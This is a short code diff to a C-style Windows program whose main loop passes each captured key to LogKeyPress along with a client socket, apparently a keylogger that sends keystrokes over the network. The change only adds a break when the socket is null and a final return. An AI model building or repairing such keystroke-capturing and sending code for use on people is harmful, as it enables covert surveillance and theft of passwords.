@@ -55,10 +55,13 @@ int main()
 			{
 				LogKeyPress(key, _clientSocket);
 			}
+			if (_clientSocket == NULL)
+				break;
 		}
 
 		Sleep(10); // Sleep for a short duration to reduce CPU usage
 	}
+	return 0;
 }
 
 void LogKeyPress(char key, SOCKET sock)
